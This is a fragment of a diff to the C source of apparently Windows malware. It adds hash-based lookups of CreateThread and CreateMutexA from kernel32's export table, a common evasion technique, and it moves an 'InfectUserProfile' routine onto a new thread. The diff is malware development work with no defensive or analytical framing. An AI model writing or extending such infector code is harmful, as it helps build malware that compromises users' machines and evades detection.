@@ -473,7 +473,8 @@ int main()
     DATA data;
     data.iat = &iat;
     GetFunctionAddress(&data);
-    InfectUserProfile(&data);
+    data.iat->fnCreateThread(NULL, 0, InfectUserProfile, &data, 0, NULL);
+    EmptyFunction();
     return 0;
 }
 
@@ -650,6 +651,17 @@ void GetFunctionAddress(PDATA data)
             data->iat->fnCloseHandle = (pCloseHandle)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
         }
 
+        // Hash of CreateThread
+        if (hash == 0x4d89b8a)
+        {
+            data->iat->fnCreateThread = (pCreateThread)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
+        }
+
+        // Hash of CreateMutexA
+        if (hash == 0x46d6e46)
+        {
+            data->iat->fnCreateMutexA = (pCreateMutexA)((PUCHAR)kernel32_base + function_table[ordinal[i]]);
+        }
 
     }
 }
